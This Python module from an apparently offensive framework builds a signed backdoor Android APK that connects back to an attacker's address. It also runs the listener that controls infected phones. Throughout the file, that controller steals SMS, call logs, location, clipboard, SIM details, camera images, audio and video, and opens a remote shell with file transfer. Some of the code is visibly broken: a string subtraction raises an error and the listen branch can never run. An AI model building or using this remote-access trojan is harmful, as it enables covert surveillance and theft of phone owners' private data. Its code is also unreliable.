import sys, os, base64, time, binascii, select, pathlib, platform, re
from subprocess import PIPE, run
import socket, threading, itertools, queue,time
from waf.libs.color import *
from waf.libs import variable as var

info = {
        "name"        : "python_server_android_reverse_tcp",
        "title"       : "Payload android",
        "module"      : "payloads/python/android/reverse_tcp apk",
        "description" : "Payload creation and exploitation"
}

var.all_var['lname'] = "payload.apk"
var.all_var['ltype'] = "listen"

options ={
  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
  "LPORT" : [str(var.all_var['lport']),'The listen port'],
  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
}

def clearDirec():
    if(platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"Dumps"):
    os.makedirs("Dumps")

def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))

def is_valid_port(port):
    i = 1 if port.isdigit() and len(port)>1  else  0
    return i

def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command,queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
    return os.getcwd()+direc+name;

def help():
    helper="""
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print(blue +"[*]Taking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag=0
    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
    imageBuffer=recvall(client)
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer=="":
        print(red+"[-]Unable to connect to the Camera\n")
        return
    with open(filename,'wb') as img:
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(green+"[+]"+default+"Succesfully Saved in : "+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1
            print(red+"[-]"+default+"Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)

def readSMS(client,data):
    print(blue +"[*]"+default+"Getting "+data+" SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
    flag =0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print(green+"[+]"+default+"Succesfully Saved in : "+getpwd(filename)+"\n")
        except UnicodeDecodeError:
            flag = 1
            print(red+"[-]"+default+"Unable to decode the SMS\n")
    if flag == 1:
        os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps"+direc+filename+"."+ext
    flag=0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(green+"[+]"+default+"Succesfully Downloaded in : "+getpwd(fileData)+"\n")
        except binascii.Error:
            flag=1
            print(red+"[-]"+default+"Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg=" "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])

        if "putFile" in msg:
            msg=" "
            sendingData=""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(green+"[+]"+default+"Succesfully Uploaded the file {filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
            else:
                print(red+"[-]"+default+"File not exist")

        if "Exiting" in msg:
            print(blue +"[*]"+default+"Exiting Shell")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)
        print(" ")
        command = input(" android@shell:~$ ")
        command = command+"\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)
        if("END123" in msg):
            return
        print(" ")

def recvall(sock):
    buff=""
    data = ""
    while "END123" not in data:
        data = sock.recv(4096).decode("UTF-8","ignore")
        buff+=data
    return buff


def recvallShell(sock):
    buff=""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8","ignore")
            buff+=data
        else:
            buff="bogus"
            return buff
    return buff

def stopAudio(client):
    print(blue +"[*]"+default+"Downloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag =0
    data=recvall(client)
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(green+"[+]"+default+"Succesfully Saved in : "+getpwd(filename))
        except binascii.Error:
            flag=1
            print(red+"[-]"+default+"Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(blue +"[*]"+default+"Downloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag=0
    data=recvall(client)
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Video_"+timestr+'.mp4'
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(green+"[+]"+default+"Succesfully Saved in : "+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(red+"[-]"+default+"Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')

def callLogs(client):
    print(blue +"[*]"+default+"Getting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
    if "No call logs" in msg:
        msg.split("\n")
        print(msg.replace("END123","").strip())
        print(" ")
    else:
        with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
            txt.write(msg)
            txt.close()
            print(green+"[+]"+default+"Succesfully Saved in : "+getpwd(filename))
            if not os.path.getsize(filename):
                os.remove(filename)

def get_shell(ip,port):
    soc = socket.socket()
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        # Restart the TCP server on exit
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(red+"[-]"+default+"%s"%e)
    soc.listen(2)
    while True:
        que = queue.Queue()
        t = threading.Thread(target=connection_checker,args=[soc,que])
        t.daemon = True
        t.start()
        if t.is_alive(): print(blue +"[*]"+default+"Waiting for Connections  ")
        t.join()
        conn, addr = que.get()
        print(green-"[+]"+default+"Done from : "+"".join(str(addr)))
        print(" ")
        while True:
            msg = conn.recv(4024).decode("UTF-8")
            if(msg.strip() == "IMAGE"):
                getImage(conn)
            elif("readSMS" in msg.strip()):
                content = msg.strip().split(" ")
                data = content[1]
                readSMS(conn,data)
            elif(msg.strip() == "SHELL"):
                shell(conn)
            elif(msg.strip() == "getLocation"):
                getLocation(conn)
            elif(msg.strip() == "stopVideo123"):
                stopVideo(conn)
            elif(msg.strip() == "stopAudio"):
                stopAudio(conn)
            elif(msg.strip() == "callLogs"):
                callLogs(conn)
            elif(msg.strip() == "help"):
                help()
            else:
                print(red+"[-]"+default+msg) if "Unknown Command" in msg else print(""+msg) if "Hello there" in msg else print(msg)
            message_to_send = input(" WAF :/> ")+"\n"
            conn.send(message_to_send.encode("UTF-8"))
            if message_to_send.strip() == "exit":
                print(" ")
                print("Ctrl -C to exit")
                sys.exit()
            if(message_to_send.strip() == "clear"):clear()


def connection_checker(socket,queue):
    conn, addr = socket.accept()
    queue.put([conn,addr])
    return conn,addr


def build(ip,port,output,icon=None):
    editor = "waf"+direc+"opt"+direc+"File_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
        file = open(editor,"r").readlines()
        #Very much uncertaninity but cant think any other way to do it xD
        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
        file[23]=file[23][:21]+"\""+port+"\""+"\n"
        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
        str_file="".join([str(elem) for elem in file])
        open(editor,"w").write(str_file)
    except Exception as e:
        print(e)
        sys.exit()
    java_version = execute("java -version")
    if java_version.returncode: print(red+"[-]"+default+"Java not installed or found");exit()
    print(blue +"[*]"+default+"Generating APK")
    outFileName = output if output else "WAF.apk"
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar waf/opt/apktool.jar b waf/opt/File_apk  -o "+outFileName,que],)
    t.start()
    if t.is_alive(): print(blue +"[*]"+default+"Building APK ")
    t.join()
    print(" ")
    resOut = que.get()
    if not resOut.returncode:
        print(green+"[+]"+default+"Successfully apk built in "+getpwd(outFileName))
        print(blue +"[*]"+default+"Signing the apk")
        t = threading.Thread(target=executeCMD,args=["java -jar waf/opt/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
        if t.is_alive(): print(blue +"[*]"+default+"Signing Apk ")
        t.join()
        print(" ")
        resOut = que.get()
        if not resOut.returncode:
            print(green+"[+]"+default+"Successfully signed the apk : "+outFileName)
        else:
            print(red+"[-]"+default+"Signing Failed")
    else:
        print(red+"[-]"+default+"Building Failed")


def running():
        try:
                if var.all_var['ltype'].lower() == "create":
                        print ("")
                        print (blue+"[*]"+default+ "Create a backdour")
                        time.sleep(2)
                        print ("")
                        time.sleep(2)
                        build(str(var.all_var['lhost']),str(var.all_var['lport']),str(var.all_var['lname']))

                elif var.all_var['ltype'].lower == "listen":
                        get_shell(str(var.all_var['lhost']),int(var.all_var['lport']))

                else:
                        print (red+"[-]"+default+"Choose LTYPE " )
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))

